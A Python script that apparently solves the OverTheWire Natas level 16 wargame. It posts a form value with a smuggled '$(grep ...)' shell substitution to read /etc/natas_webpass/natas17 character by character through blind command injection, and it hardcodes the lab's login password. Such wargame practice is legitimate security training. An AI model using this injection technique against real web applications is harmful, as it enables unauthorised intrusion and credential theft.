#!/usr/bin/python
import requests
import string
def get_flag():
    username = 'natas16'
    password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
    guess = ''
    possible_chars = string.lowercase + string.uppercase + string.digits
    url = 'http://' + username + '.natas.labs.overthewire.org/'
    # if the command grep ^(letter) file returns input then it will be the Flag
    # the flag is not in the dictionary so no output would show up
    # if output does show up for 'hacked' then the character is not in the flag
    while(len(guess) < 32):
        for c in possible_chars:
            session = requests.Session()
            obj = {'needle' : '$(grep ^' + guess + c + ' /etc/natas_webpass/natas17)hacked'}
            response = session.post(url, data = obj, auth = (username, password))
            s = response.text
            if(len(s[s.find('Output'):])==120):
                guess += c
                print(guess)
    print("Flag: " + guess)
get_flag()
